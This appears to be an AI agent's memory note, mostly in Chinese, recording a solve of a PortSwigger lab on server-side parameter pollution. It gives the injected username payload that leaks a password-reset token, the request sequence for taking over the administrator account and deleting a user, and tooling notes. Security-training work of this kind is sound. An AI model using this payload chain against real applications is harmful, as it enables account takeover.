---
metadata:
  node_type: memory
name: "PRS pp-1 server-side parameter pollution re-verify"
description: "pp-1 复验:query-string SSPP 冷实例一次通过(重置令牌污染 → 改 administrator 口令 → 删 carlos → banner solved);记两个坑:wiener:peter 登录被拒、http_session 打 portswigger.net 超时须走 http_wait"
last_updated: 2026-10-12T15:03:27+08:00
created: 2026-10-12T15:03:27+08:00
---

## 2026-10-12 pp-1 复验:Exploiting server-side parameter pollution in a query string

题面核对:派单 slug `lab-server-side-parameter-pollution` 是简写。sitemap 实查该题族只有两题(query-string / rest-url),两题描述目标同为「以 administrator 登录并删除 carlos」。reset_token 内层槽指向 query-string 题,实例标题确认。

冷实例:range_launch widget-lab-id `D74FC3117A595F2183EB88A24360BB9C2A7472A910E4E97B4907971835D1F4E3`,`reused:false` → `https://0ab4008704b0287082ad4c9e00b00040.web-security-academy.net/`。

链路(全程免登录即可完成,administrator 登录只在收尾):
1. GET /forgot-password 取 csrf;POST /forgot-password(csrf+username=administrator)基线 = `{"type":"email","result":"*****@normal-user.net"}`。
2. 污染形(表单体里 username 值写成 `administrator%26field=<X>%23`,前端解码后拼进内层查询):
   - `%26field=foo%23` → 400 `{"type":"ClientError","code":400,"error":"Invalid field."}`(暴露内层参数名 field)
   - `%26field=reset_token%23` → 200 `{"type":"reset_token","result":"oezubcilq7xm1j6u0wuzyxtrftbl6n7"}`(内层参数名显形)
   - `%26field=email%23` → 掩码邮箱
3. GET /forgot-password?reset_token=<token> → 改密表单(csrf / reset_token / new-password-1 / new-password-2);POST 后 302 Location `/`。
4. 新会话 GET /login 取 csrf → POST /login administrator:Passw0rd123 → 302 `/my-account`。
5. GET /admin → `carlos - Delete`;GET /admin/delete?username=carlos → 302 `/admin`。
6. banner_verdict → `solved:true`,`Congratulations, you solved the lab!`(冷实例、无旧解残像)。

件面要点:
- form_sweep 的取值表**原样投递、不做二次编码**,所以 URL 编码后的注入形给什么进去就是什么,一个信封扫完整个内层参数名面盘(4 变体 8.6s)。
- 验证腿一律不带 --follow:改密的 302→/、登录的 302→/my-account、删除的 302→/admin 三条回执都是证据本身。

坑(如实记):
- POST /login `wiener:peter` 在本实例两次被拒(200 `Invalid username or password.`,--form 与裸 body 各一次),口径未查明;本题主链不依赖该账号,administrator 登录一次成功,故未阻塞。
- http_session / page_read 打 `portswigger.net` 反复 `timed out reading response`,同一时刻 `http_wait --timeout-secs`(和 curl)1 秒级 200;拿题面页/ sitemap 全走 http_wait。实例域(`*.web-security-academy.net`)上 http_session 正常。
- 404 教训:query-string 题的真实 slug 是 `lab-exploiting-server-side-parameter-pollution-in-query-string`,别按派单 slug 硬拼路径;portswigger.net/sitemap.xml 直接 grep `<loc>` 最快。

